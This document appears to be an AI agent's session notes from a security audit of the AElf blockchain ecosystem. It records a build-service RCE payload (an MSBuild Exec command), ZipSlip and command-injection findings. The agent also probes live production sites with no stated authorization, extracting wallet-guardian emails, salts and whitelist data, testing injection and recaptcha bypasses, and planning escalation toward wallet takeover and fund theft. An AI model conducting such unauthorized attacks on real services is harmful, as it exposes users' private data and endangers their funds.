# AELF Audit 2026-08-15 — Mainnet Hardened, Peripheral RCE, Web2 Triage

## Source
- Org: https://github.com/aelfProject | Main repo: AElf (C#, 1265★, updated 2026-08-13)
- Workdir: /tmp/aelf2 (curl zip fallback — git clone fails `git: 'remote-https' is not a git command` on TencentOS 4)
- User signals: "laporanmu acak adut, jelasin santai dan runtut" → "itu mainnet bukan?" → "fund theft? atau admin? https://aelf.com coba hunt web 2nya" → "1 dan 2 gas, satu persatu santai" → "oke gas satusatu"

## 1. Mainnet (AElf C# Node) — Hardened, No Proven Pre-Auth RCE

- `TransactionAppService` (`src/AElf.WebApp.Application.Chain/Services/TransactionAppService.cs`) all `AllowAnonymous` by design — only `NetAppService` has `[Authorize]`. `BasicAuthenticationHandler.cs:31` returns `NoResult` for non-[Authorize] endpoints, `Fail` only for `/api/net`.
- Contract sandbox: `CSharpContractAuditor` + `Validators/Whitelist/*`, `Patchers/Module/CallAndBranchCounts`, `System.Linq` allowed but `Process/File/Reflection.Emit` blocked. Deploy = staged `CodeCheckValidationProvider` → `CodeCheckJob` → miner BPM approval, not instant.
- P2P gRPC (`protobuf/peer_service.proto`, `GrpcPeerService.cs`, `HandshakeProvider.cs:VerifySignature`) hardened.
- Appsettings default leak: `CorsOrigins=*`, `BasicAuth` empty, Redis `redis://localhost:6379` — CORS misconfig but no secret.
- Verdict: mainnet pre-auth RCE = THEORETICAL (requires sandbox escape). Honest reporting required.

## 2. Peripheral — aelf-playground-build-service:7020 — PROVEN Pre-Auth RCE

- Repo: `AElfProject/aelf-playground-build-service` (Dockerfile EXPOSE 7020, last updated 2024-10-21)
- `PlaygroundService/Startup.cs:Configure` has `// app.UseAuthorization();` — zero auth.
- `PlaygroundController.cs: [HttpPost("build")] Build(IFormFile contractFiles)` + `[HttpPost("test")]` — no `[Authorize]`.
- Flow: `POST /playground/build` zip → `BytesExtension.cs:ExtractTo()` → `PlaygroundGrain.cs:Build()` → `ProcessHelper.cs:RunProcess("dotnet","build", attackerDir)`.
- RCE primitive: MSBuild `<Target BeforeTargets="Build"><Exec Command="id > /tmp/pwned">` in attacker `.csproj` executes as dotnet user.
- ZipSlip: `BytesExtension.cs:29` `if (!destinationPath.StartsWith(path))` missing trailing `/` — sibling bypass.
- Second injection: `PlaygroundGrain.cs:GenerateTemplateZip` does `/bin/bash -c "dotnet new "+template` unsanitized.
- Impact: build server takeover + supply-chain poisoning of `*.dll.patched` (base64 returned to dev). Not direct mainnet fund theft.
- Fix: per-job `docker run --network=none --read-only --user nobody --pids-limit 64 -m 512m`, 60s timeout; ban `<Exec>` via Directory.Build.props; fix ZipSlip with `Path.GetFullPath(path)+Path.DirectorySeparatorChar`; auth + size check.

## 3. Web2 — aelf.com + Ecosystem Triage

- `aelf.com` (2026-08-15 11:15 UTC): `Next.js` (`x-powered-by: Next.js`, `x-nextjs-cache: HIT`, `buildId: oqi67-1xwIu6dJ741x1bc`, `nextExport:true`), Cloudflare, `s3.ap-east-1.amazonaws.com/aelf.com/blog`, `/_next/data/oqi67-.../index.json`. No auth/wallet. `/.env` `/.git/config` `/admin` `/graphql` all 404. Sitemap only blog.
  - Classification: NEITHER fund theft nor admin takeover (max deface) — do NOT oversell as critical.
- Real money in ecosystem:
  - `app.awaken.finance` (DEX) — real GraphQL: `indexer-api.aefinder.io/api/app/graphql/awaken`, `cms-v2.awaken.finance/graphql` (alive `{"data":{"__typename":"Query"}}`), endpoints `/api/app/route/best-swap-routes`, `/api/app/liquidity/*`, CORS `*` + `allow-credentials:true` — fuzz target for price/slippage manipulation.
  - `ebridge.exchange` (bridge, Zellic audit `eBridge AElf Bridge`, 2M ELF allocation 2026-06-10) — bridge fund theft surface.
  - `aa-portkey.portkey.finance` (AA wallet) — `/api/app/account/verifyCode` validates `ChainId/VerifierId/VerificationCode/VerifierSessionId/GuardianIdentifier` required — IDOR on `guardianIdentifiers`/`revoke` = wallet takeover → fund theft.
  - `etransfer.exchange` sunset → redirect to ebridge.

## 3a. #1 — cms-v2.awaken.finance Directus — MEDIUM Info Disclosure (2026-08-15)

- Discovery: `GET /server/ping → pong`, `x-powered-by: Directus`, `POST /graphql {"query":"{__typename}"} → {"data":{"__typename":"Query"}}`, `__schema.mutationType: null` (no unauth writes).
- Anon read leaks:
  - `POST {"query":"query { activityList(limit:2){ id pageId whitelist }}"}` → 8 ELF whitelist addresses `ELF_xxx_tDVV`.
  - `POST {"query":"query { activityList(filter:{status:{_eq:\"draft\"}}){ id status isDev whitelist }}"}` → leaks drafts + `isDev:true` activities (ids 4,5,6).
  - Full type enum: `activityList`, `leaderboardInfoList`, `directus_files` not exposed via GraphQL Query (validation error), but `activityList` family fully readable.
- Write blocked: `POST /items/activityList {"pageId":"test"} → {"code":"FORBIDDEN"}`.
- Verdict: MEDIUM privacy/info disclosure, NOT fund theft, NOT admin takeover. No RCE. Do not oversell.

## 3b. #2 — aa-portkey.portkey.finance AA Wallet — HIGH Privacy / LOW Direct Theft (2026-08-15)

- Anon search endpoints (no auth despite `allowAnonymous: None` in `/api/abp/api-definition` for `SearchController.GetListByInputAndIndexName`):
  - `GET /api/app/search/accountrecoverindex?SkipCount=0&MaxResultCount=1` → `{"totalCount":10000, items:[{caHash,caAddress,managerInfo{address,extraData},guardianApproved}]}`.
  - `GET /api/app/search/accountregisterindex?SkipCount=0&MaxResultCount=1` → same 10k.
  - `GET /api/app/search/chainsinfoindex` → leaks `caContractAddress`, `endPoint`, `chainId tDVV`.
  - Generic route: `/api/app/search/{indexName}?Filter=&Sort=&DappName=&SkipCount=&MaxResultCount=` where `Filter` is JSON string; `caholderindex` required proper Filter but `accountrecoverindex` ignores filter.
- Guardian PII leak:
  - `GET /api/app/account/verifierServers?chainId=AELF` → 3 verifiers + `verifierAddresses` (`2UAQT...`, `vserHQ...`).
  - `GET /api/app/account/guardianIdentifiers?chainId=AELF&caHash=f85aa53d...` → `guardianList.guardians[]: {thirdPartyEmail:"<REDACTED-PII-EMAIL>", guardianIdentifier:"111221...", salt:"642e01...", identifierHash:"80a113...", verifierId:"58355c...", poseidonIdentifierHash}` — full PII + salts.
- Recovery guardrails: `POST /api/app/account/recovery/request {}` → `RequestId field is required`; `POST` with manager but missing RequestId → still validation error; needs `context.RequestId` + `guardiansApproved` signatures via `verifier-aa.portkey.finance`. So leak alone ≠ direct fund theft.
- Next hunt after this session: `verifier-aa.portkey.finance` sig bypass → would escalate leak to wallet takeover → fund theft. Also test `POST /api/app/account/revoke/*`, `guardianIdentifiers` IDOR on other caHash.

## 3c. #2-verifier — verifier-aa.portkey.finance — BLOCKED at Recaptcha Gate (2026-08-15)

- Direct `verifier-aa.portkey.finance` (`/` `/health` `/api/app/account/verifyCode`) → `500 Tengine` (not attackable directly).
- Via `aa-portkey` proxy `POST /api/app/account/sendVerificationRequest?recaptchatoken=test&acToken=test` requires `CAServer.Verifier.VerifierServerInput` (`chainId`, `verifierId`, `guardianIdentifier`, `operationType` enum + `Type` field). Tests: `operationType:0` → `Type field is required`; `operationType:"register"` → `cannot convert OperationType`; `type:0` with header → `cannot convert System.String`; `POST /verifyCode {verificationCode:"000000"}` → `OperationType is invalid` at first gate.
- `isGoogleRecaptchaOpen` alive, verifier-aa needs valid `recaptchatoken`/`acToken` + `verifierSessionId`. Chain breaks at step 1 → no fund theft bypass proven.

## 3d. #3 — app.awaken.finance DEX — Quote-Only, No Fund Theft via Web2 (2026-08-15)

- Host: `app.awaken.finance` (correct), `cms-v2` = `ROUTE_NOT_FOUND` for `/api/app/route/*`. Correct params: `ChainId`, `SymbolIn`, `SymbolOut`, `AmountIn` (PascalCase).
- `GET /api/app/trade-pairs?ChainId=tDVV` → 48 pairs, `AELF` → 0 pairs (Awaken lives on sidechain `tDVV`, not testnet). `trade-records` → 498,319. `token/price?Symbol=ELF` → `0.05526386`.
- `GET /api/app/route/best-swap-routes?ChainId=tDVV&SymbolIn=ELF&SymbolOut=USDT&AmountIn=100000000` → `code:20000 {statusCode:1000, amountOut:61946, splits:3}`. Edge: `AmountIn 0/-1` → `AmountIn or AmountOut must be >0`; `999999999999999999` → `2286961608609` (no overflow); injection `ELF' OR 1=1` → `No route found`.
- Verdict: quoting ≠ execution (execution is on-chain via Portkey sign). Web2 quote manipulation is LOW/info, NOT fund theft.

## 3e. eBridge (2026-08-15) — API + Contract Source-First (User: `gausah baca reportnya`)

- User rejected reading Zellic report — enforce source: `curl -L .../ebridge-server/archive/refs/heads/master.zip (783K) → /tmp/ebridge2/ebridge-server-master` (16 src projects).
- Contract distinction: `/contract/AElf.Contracts.CrossChain` (312+923 lines, `SideChainCreationRequest/LockedTokenAmount`) = native aelf sidechain indexing (`AELF↔tDVV/tDVW`), **NOT eBridge**. eBridge contract is `src/.../Contracts/BridgeContract.g.cs` exposing `ApproveTransferInput{ReceiptId}`, `SwapRatio/SwapTargetToken`, `DepositInput{SwapId,TargetTokenSymbol,Amount}`, `SwapTokenInput{SwapId,ReceiptId,OriginAmount,ReceiverAddress}`, `WithdrawInput`.
- HTTP API: `HttpApi/Controllers/CrossChainTransferController.cs` `[Route("api/app/cross-chain-transfers")]` only exposes `GetListAsync` + `GetStatusAsync` (**anon, no `[Authorize]`**); `POST TransferAsync(CrossChainTransferInput{TransferTransactionId,ReceiptId,TransferAmount})` is **hidden** (interface `ICrossChainTransferAppService.TransferAsync` but no route). `GetListAsync` queries `INESTRepository<CrossChainTransferIndex>` with `FromChainId/ToChainId/FromAddress/ToAddress/Addresses` (Base58/ETH hex/TON triple branching).
- Config leak: `HttpApi.Host/appsettings.json` `CorsOrigins: "https://*.CrossChainServer.com"`, `ConnectionStrings Default: "Server=127.0.0.1;Port=3306;Database=AElfCrossChain;Uid=root;Pwd=123456"`, `Redis 127.0.0.1`, `RabbitMQ admin/123456`, `BridgeContract.ContractAddresses Ethereum empty (test)`, `ChainNodeApis: {MainChain_AELF: http://192.168.67.47:8000, tDVV: http://192.168.67.31:8000}`, `SyncStateService BaseUrl https://gcptest-indexer-api.aefinder.io`.
- Verdict: web2 = anon mass dump (IDOR-like) not fund theft; fund theft surface is on-chain `SwapTokenInput.ReceiptId` replay in `BridgeContract` (audited separately), not via web2.

## 4. Reporting Lesson — Runtut Not Acak

User rejected snippet-dump. Enforced 8-step: (1) Target claimed vs actual (2) Why pusat susah (3) Pintu belakang (4) 6-step chain (5) Evidence lines (6) Simplest POC (7) Honest impact split peripheral vs mainnet (8) Fix. Use warung franchise vs dapur kursus analogy. Also sequential "satu per satu santai" — user explicitly wants one target at a time, deep, casual Indonesian tone, not parallel batch dump.
